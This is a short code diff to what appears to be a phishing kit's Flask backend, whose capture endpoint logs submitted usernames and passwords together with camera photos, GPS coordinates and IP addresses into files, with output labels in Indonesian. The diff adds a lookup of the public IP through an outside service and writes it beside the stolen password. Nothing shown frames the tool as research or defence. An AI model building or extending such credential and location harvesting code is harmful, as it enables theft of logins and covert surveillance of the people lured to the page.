@@ -2,6 +2,7 @@ import os
 import json
 import base64
 import shutil
+import requests
 from datetime import datetime
 from flask import Flask, request, render_template, jsonify, send_from_directory
 
@@ -13,6 +14,13 @@ DATA_FILE = os.path.join(CAPTURED_DIR, "data.txt")
 GPS_FILE = os.path.join(CAPTURED_DIR, "gps.txt")
 
 os.makedirs(IMAGES_DIR, exist_ok=True)
+
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return response.json()['ip']
+    except:
+        return None
 
 @app.route('/')
 def index():
@@ -26,6 +34,7 @@ def capture():
         password = data.get('password', '-')
         image_data = data.get('image', '')
         ip = request.remote_addr
+        public_ip = get_public_ip()
         lat = data.get('lat', '-')
         lon = data.get('lon', '-')
         acc = data.get('acc', '-')
@@ -53,6 +62,8 @@ def capture():
             f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
             f.write(f"📅 WAKTU  : {timestamp}\n")
             f.write(f"🌐 IP     : {ip}\n")
+            if public_ip:
+                f.write(f"🌐 IP PUBLIK : {public_ip}\n")
             f.write(f"👤 USER   : {username}\n")
             f.write(f"🔑 PASS   : {password}\n")
             f.write(f"📸 FOTO   : {image_path}\n")
